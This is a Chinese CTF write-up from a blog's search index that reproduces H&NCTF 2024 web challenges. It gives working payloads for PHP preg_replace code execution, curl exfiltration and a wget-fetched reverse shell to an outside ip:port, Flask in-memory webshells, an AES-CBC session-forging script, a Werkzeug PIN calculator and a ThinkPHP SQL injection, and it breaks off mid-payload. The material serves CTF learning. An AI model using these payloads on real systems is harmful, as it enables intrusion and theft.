<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>H&amp;NCTF 2024 web复现</title>
      <link href="/2024/06/01/H-NCTF-2024-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/01/H-NCTF-2024-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="H-NCTF-2024-web复现"><a href="#H-NCTF-2024-web复现" class="headerlink" title="H&amp;NCTF 2024 web复现"></a>H&amp;NCTF 2024 web复现</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>被打烂了，复现一下</p><h3 id="Please-RCE-Me（array-map函数、getallheaders函数、16进制转字符串读文件）"><a href="#Please-RCE-Me（array-map函数、getallheaders函数、16进制转字符串读文件）" class="headerlink" title="Please_RCE_Me（array_map函数、getallheaders函数、16进制转字符串读文件）"></a>Please_RCE_Me（array_map函数、getallheaders函数、16进制转字符串读文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>法一：由于第一个正则匹配没开启大小写匹配，第二个开启了，故可以用大小写绕过，rce可以用到array_map函数，官方文档<a href="https://www.php.net/manual/zh/function.array-map.php">array_map</a>，简单来说就是对array_map传入两个参数，第一个参数是调用的函数，第二个参数需要是一个数组，且默认调用数组的第一个元素为返回值传给第一个调用的函数并执行返回结果，payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?<span class="attribute">moran</span>=flag&amp;a=system&amp;b[]=cat /f*</span><br><span class="line">POST：<span class="attribute">task</span>=array_map($_GET[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])&amp;<span class="attribute">flag</span>=please_give_me_flaG</span><br></pre></td></tr></table></figure><p>法二：没有禁用数字，可以用16进制转字符串直接读&#x2F;flag文件，payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?<span class="attribute">moran</span>=flag</span><br><span class="line">POST：<span class="attribute">flag</span>=please_give_me_flaG&amp;task=print(file_get_contents(&quot;\x2f\x66\x6c\x61\x67&quot;))</span><br></pre></td></tr></table></figure><p>法三：先用<code>var_dump(scandir(&quot;/&quot;))</code>打印出根目录下所有文件和文件夹，发现<code>/flag</code>目录，利用getallheaders()，将要读取的文件名写到HTTP头部字段，再读文件，payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /?moran=flag HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">a</span>:/flag</span><br><span class="line"><span class="attribute">Host</span>: hnctf.imxbt.cn:<span class="number">39102</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64; rv:<span class="number">125</span>.<span class="number">0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">125</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">68</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">task</span>=highlight_file((pos(getallheaders())))&amp;flag=please_give_me_flaG</span><br></pre></td></tr></table></figure><blockquote><p><code>getallheaders()</code> 也是 PHP 的内置函数，返回一个包含所有 HTTP 头信息的数组</p><p><code>pos()</code> 函数是 PHP 中的一个内置函数，返回数组中的当前元素</p><p><code>pos(getallheaders())</code>返回的数组中的第一个元素（也就是第一个 HTTP 头信息），然后尝试将其作为参数传递给 <code>highlight_file()</code>，且<code>highlight_file()</code>函数期望的是一个文件路径作为参数</p></blockquote><h3 id="ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）"><a href="#ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）" class="headerlink" title="ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）"></a>ezFlask（curl外带、执行远程py脚本反弹shell、flask内存马）</h3><p>可以直接curl外带</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">cmd</span>=__import__(&quot;os&quot;).system(&quot;curl ip:port?<span class="attribute">a</span>=`cat /etc/jaygalf|ba<span class="string">&#x27;&#x27;</span>se64`<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure><p>还在网上看到一种方法，见文章：<a href="https://lisien11.github.io/2024/05/13/hnctf-wp/">https://lisien11.github.io/2024/05/13/hnctf-wp/</a></p><p>因为这道题目有python环境那么可以直接远程下载一个可以反弹shell的python脚本再执行就可以反弹shell了，</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>)<span class="selector-class">.popen</span>(<span class="string">&quot;wget ip:port/shell.py -O /tmp/shell.py;chmod 777 /tmp/shell.py;/tmp/shell.py&quot;</span>)<span class="selector-class">.read</span>()</span><br></pre></td></tr></table></figure><p>正常做法是注入内存马，payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">cmd=render_template_string(&quot;</span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__</span>[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\<span class="name">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><span class="language-xml">&quot;)</span></span><br></pre></td></tr></table></figure><p>再访问<code>/shell</code>路由，传入<code>grep -rl &quot;flag&#123;&quot; /etc</code>，这个命令是在 <code>/etc</code> 目录下递归查找含有文本 “flag{“ 的文件，并只列出含有匹配文本的文件路径</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bac3789.png" alt="image-20240521213201642.png"></p><p>访问该文件即可出flag，或以下内存马也行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#同时get传参cmd执行命令</span><br><span class="line">cmd=<span class="built_in">str</span>(app<span class="selector-class">.after_request_funcs</span><span class="selector-class">.setdefault</span>(None, <span class="selector-attr">[]</span>)<span class="selector-class">.append</span>(lambda resp: CmdResp <span class="keyword">if</span> request<span class="selector-class">.args</span><span class="selector-class">.get</span>(<span class="string">&#x27;cmd&#x27;</span>) and <span class="built_in">exec</span>(<span class="string">&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(os.popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;</span>)==None <span class="keyword">else</span> resp))</span><br><span class="line"></span><br><span class="line">#同时get传参cmd执行命令</span><br><span class="line">cmd=app<span class="selector-class">.before_request_funcs</span><span class="selector-class">.setdefault</span>(None, <span class="selector-attr">[]</span>)<span class="selector-class">.append</span>(lambda :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(request<span class="selector-class">.args</span><span class="selector-class">.get</span>(<span class="string">&#x27;cmd&#x27;</span>))<span class="selector-class">.read</span>())</span><br></pre></td></tr></table></figure><h3 id="flipPin（AES-CBC翻转攻击、pin码计算）"><a href="#flipPin（AES-CBC翻转攻击、pin码计算）" class="headerlink" title="flipPin（AES CBC翻转攻击、pin码计算）"></a>flipPin（AES CBC翻转攻击、pin码计算）</h3><p>参考题目：<a href="https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped">https://github.com/tamuctf/tamuctf-2024/tree/master/web/flipped</a></p><p>访问<code>/hint</code>路由拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>读完上面源码，大概思路就是在<code>/read</code>路由下伪造admin的session然后GET传参给<code>filename</code>读文件，但伪造session要用到AES CBC翻转攻击：<a href="https://blog.csdn.net/V1040375575/article/details/111773524%EF%BC%8C%E6%B2%A1%E7%9C%8B%E6%87%82%EF%BC%8C%E5%BC%95%E7%94%A8%E4%BD%AC%E7%9A%84%E8%84%9A%E6%9C%AC%E4%BA%86%EF%BC%9Ahttps://lisien11.github.io/2024/05/13/hnctf-wp/index.html">https://blog.csdn.net/V1040375575/article/details/111773524，没看懂，引用佬的脚本了：https://lisien11.github.io/2024/05/13/hnctf-wp/index.html</a></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="meta"># iv</span></span><br><span class="line"><span class="meta"># 第一组：&#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="meta"># 第二组：ername&quot;: &quot;guest&quot;</span></span><br><span class="line"><span class="meta"># 第三组：&#125;</span></span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(<span class="string">&quot;NvZVu1mOQAgjuCgIb1bfn1YQDnitktKno3573zjNvA4rIYYWg7XRQ5yAQoMz5PhVjTQfblgIu//ybtBUumRYjg==&quot;</span>)</span><br><span class="line">print(len(cipher))</span><br><span class="line"></span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">iv = array_cipher[<span class="number">0</span>:<span class="type">16</span>]</span><br><span class="line">print(iv)</span><br><span class="line"></span><br><span class="line">decode_plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span>    <span class="meta">#把admin的值改为1即可</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#加密后的密文</span></span><br><span class="line">plain = <span class="string">&#x27;&#123;&quot;admin&quot;: 1, &quot;us&#x27;</span>   <span class="meta">#只需要修改admin的值所以这里只改变第一组的值即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">iv</span> = list(iv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):<span class="type"></span></span><br><span class="line">    <span class="keyword">new</span><span class="type">iv</span>[i] = (ord(plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)) ^ iv[i] ^ ord(decode_plain[i].encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">iv</span> = bytes(<span class="keyword">new</span><span class="type">iv</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;newiv:&#x27;</span>, base64.b64encode(<span class="keyword">new</span><span class="type">iv</span> + cipher[<span class="number">16</span>:<span class="type"></span>]))</span><br></pre></td></tr></table></figure><p>最后就是计算pin值了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>  <span class="comment"># /etc/passwd得到</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377892356&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&quot;9fd11036-6c2e-41c7-bb26-7d358f670070157ce012bcac9806b8c67a2fa6dcda9f2556c46d6b97fb841ac20117abe90a5e&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="comment"># machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p><code>/hint</code>路由中给出是过滤了self和cgroup的，文章：<a href="https://blog.csdn.net/weixin_63231007/article/details/131659892%E9%87%8C%E7%BB%99%E5%87%BA%E4%BA%86%E6%96%B9%E6%B3%95%EF%BC%9A">https://blog.csdn.net/weixin_63231007/article/details/131659892里给出了方法：</a></p><ul><li>过滤了self的时候怎么读 machine-id   <ul><li>其中的<code>self</code>可以用相关进程的pid去替换,其实<code>1</code>就行</li></ul></li><li>过滤 cgroup<ul><li>用<code>mountinfo</code>或者<code>cpuset</code></li></ul></li></ul><p>还过滤了mountinfo，所以在读machine-id时可以用&#x2F;proc&#x2F;1&#x2F;cpuset来绕过，根目录下有flag文件，但我们是ctfUser，权限不够，直接读环境变量出flag</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bab9727.png" alt="image-20240526204639811.png"></p><h3 id="ez-tp（tp3-2-3）"><a href="#ez-tp（tp3-2-3）" class="headerlink" title="ez_tp（tp3.2.3）"></a>ez_tp（tp3.2.3）</h3><p>下载附件看到是tp3.2.3</p><p><img src="https://img.picui.cn/free/2024/06/01/665b08bad3455.png" alt="屏幕截图 2024-05-26 211938.png"></p><p><img src="https://img.picui.cn/free/2024/06/01/665b08baca9f0.png" alt="image-20240526212318203.png"></p><p>sql注入中的exp注入，具体调试见文章：<a href="https://blog.csdn.net/rfrder/article/details/114024426">https://blog.csdn.net/rfrder/article/details/114024426</a></p><p>GET传参是参数名为name，且只回显两个字段，故payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span 